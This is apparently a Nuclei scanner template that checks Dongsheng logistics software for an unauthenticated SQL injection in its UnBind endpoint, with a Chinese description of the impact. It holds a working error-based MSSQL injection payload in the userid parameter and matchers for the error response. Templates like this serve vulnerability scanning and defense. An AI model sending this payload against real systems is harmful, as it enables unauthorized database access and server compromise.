id: dongshengsoft-UnBind-sqli
info:
  name: 东胜物流软件 UnBind 存在SQL注入漏洞
  author: leadlife
  severity: high
  description: 东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 UnBind  接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ea4ywdl3w00sgxyy
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: dongshengsoft,sqli

http:
  - raw:
      - |
        GET /Mobile/Login/UnBind?userid=-2963%27+OR+1636+IN+%28SELECT+%28%40%40VERSION%2B%28SELECT+%28CASE+WHEN+%281636%3D1636%29+THEN+1+ELSE+0+END%29%29%2B%40%40VERSION%29%29--+oTEn HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'Microsoft SQL Server')
        condition: and